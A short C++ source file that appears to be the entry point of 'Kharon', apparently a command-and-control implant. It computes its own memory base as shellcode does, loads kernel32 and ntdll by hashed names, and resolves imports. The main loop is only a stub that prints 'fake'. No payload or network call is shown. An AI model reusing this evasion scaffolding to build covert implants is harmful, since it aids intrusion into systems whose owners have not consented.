#include <Kharon.h>

using namespace Root;

EXTERN_C DECLFN auto Main(
    _In_ UPTR Argument
) {
    Root::Kharon().Start( Argument );
}

DECLFN Kharon::Kharon( void ) {
    Kharon::Session.Base.Start  = StartPtr();
    Kharon::Session.Base.Length = ( EndPtr() - Kharon::Session.Base.Start );

    Krnl32.Handle = LdrLoad::Module( Hsh::StrA<CHAR>( "kernel32.dll" ) );
    Ntdll.Handle  = LdrLoad::Module( Hsh::StrA<CHAR>( "ntdll.dll" ) );

    Kharon::Session.HeapHandle = U_PTR( NtCurrentPeb()->ProcessHeap );

    RSL_IMP( Krnl32 );
    RSL_IMP( Ntdll );
}

auto DECLFN Kharon::Start(
    _In_ UPTR Argument
) -> void {
    do {
        KhDbg( "fake" );
    } while ( Session.Connected );
}